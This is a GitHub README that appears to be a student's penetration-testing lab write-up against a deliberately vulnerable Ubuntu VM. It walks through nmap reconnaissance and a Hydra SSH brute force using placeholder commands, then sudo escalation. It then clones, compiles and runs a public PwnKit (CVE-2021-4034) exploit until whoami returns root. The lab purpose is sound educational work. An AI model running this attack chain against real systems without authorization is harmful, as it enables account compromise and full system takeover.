# ubuntu-privesc-lab
Full penetration testing workflow: credential brute force, SSH access and privilege escalation (CVE-2021-4034)

OVERVIEW

This project demonstrates a full penetration testing workflow against a vulnerable Ubuntu virtual machine. The attack chain includes reconnaissance, credential brute forcing, initial access, and privilege escalation using multiple techniques.


TOOLS USED

Nmap
Hydra
SSH
Git
CVE-2021-4034 (PwnKit)


RECONNAISSANCE

The recon was conducted using Nmap which revealed the number of hosts open in the specific network ( wifi ).
nmap < Network IP 0/24 > : This revealed the number of active hosts and their MAC address.
<img width="1920" height="1045" alt="Recon for finding VM 1" src="https://github.com/user-attachments/assets/2dd87d58-90c9-433e-8e25-3609372ee718" />

As observed the VM was running in the ORACLE VIRTUAL BOX, we could make out that this was our Vuln VM and the IP as follows.

<img width="1920" height="1045" alt="Recon for VM 2" src="https://github.com/user-attachments/assets/689b9847-cdbd-4d25-bda4-dc36a3819ffd" />

Further Scan revealed detected vulnerable open ports for attack. 

PRIMARY EXPLOIT 


Using that I attempted a successful Credential Brute Force attack with the help of Hydra
hydra -l < USERNAME > or -L < File.txt > -p < PASSWORD > or -P < File.txt > < TARGET IP > < PORT > 

<img width="1920" height="1045" alt="Hydra for Vuln  VM" src="https://github.com/user-attachments/assets/2f9e1f1e-b944-4750-a7df-28f1cd3a656e" />

This successful password exploit led us to use the credientials for the SSH port exploit as well.

ssh < USERNAME@TARGET IP > Password < exploit password >

<img width="1920" height="1045" alt="SSH exploit using credentials gained from password" src="https://github.com/user-attachments/assets/0e1fdda3-ba3a-4214-82f2-7349769ebd87" />

This gave us the initial access to our Victim system. Furthermore the sudo Misconfiguration gave us the full access to the root 
sudo -l : (ALL : ALL) ALL

sudo su was the escalation



SECONDARY EXPLOIT

We continued to exploit the victim system with the help of "Pwnkit CVE-2021-4034". 


PwnKit (CVE-2021-4034) is a critical security vulnerability discovered in early 2022 by the Qualys research team, affecting the Polkit framework on Linux systems. It is a local privilege escalation (LPE) flaw that allows any standard, unprivileged user to gain full root privileges (administrative access) on a system. The vulnerability has existed since Polkit's introduction in 2009 and is considered "trivial" to exploit, making it highly dangerous. 


Common Vulnerabilities and Exposures (CVE) is a standardized, publicly disclosed list of cybersecurity vulnerabilities and exposures in software and hardware.


INSTALLING CVE-2021-4034 and Exploiting the VM

First, I confirmed that the target system was potentially vulnerable by checking the presence and permissions of pkexec: which pkexec
output: ls -la /usr/bin/pkexec
The binary had the SUID bit set, indicating it runs with root privileges, making it a viable target for exploitation.

Prepare the Environment

To compile the exploit, required tools were installed:
sudo apt update
sudo apt install git build-essential -y
This ensured the system had the necessary compiler and dependencies.
If the system's apt has any bacground tasks running, Kill it.

Transfer / Obtain Exploit Code

The exploit was cloned directly onto the victim machine:
cd /tmp
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
Using /tmp avoids clutter and reflects realistic attacker behavior.
<img width="1920" height="1045" alt="Installing CVE-2021-4034" src="https://github.com/user-attachments/assets/1ead177a-83e7-4c0a-b3c6-9ada7b308f63" />
<img width="1920" height="1045" alt="Git installation for CVE KIT" src="https://github.com/user-attachments/assets/d9092cc6-1320-4ae7-a169-eb5fc490434d" />


Compile the Exploit

The exploit was compiled using: "make"

This generated the executable required to trigger the vulnerability.


Execute the Exploit

The exploit was executed:
./cve-2021-4034


Verify Privilege Escalation

After execution, root access was confirmed: whoami

Output: root

<img width="1920" height="1045" alt="Privelege exploitation and access into the VM" src="https://github.com/user-attachments/assets/b5fcbe74-7c54-4064-b3af-c73d0dffc142" />

This exploit works because pkexec improperly handles environment variables, allowing attackers to execute arbitrary code with elevated privileges.



CONCLUSION

This exercise demonstrates how a seemingly low-privileged user can escalate to full system control by exploiting a known vulnerability like PwnKit (CVE-2021-4034). By combining initial access through credential compromise with systematic enumeration and exploitation, it was possible to achieve root access without relying on misconfigurations alone. This highlights the critical importance of timely patch management and secure configuration practices. Even a single overlooked vulnerability can lead to complete system compromise, emphasizing the need for continuous security assessments and defense-in-depth strategies.





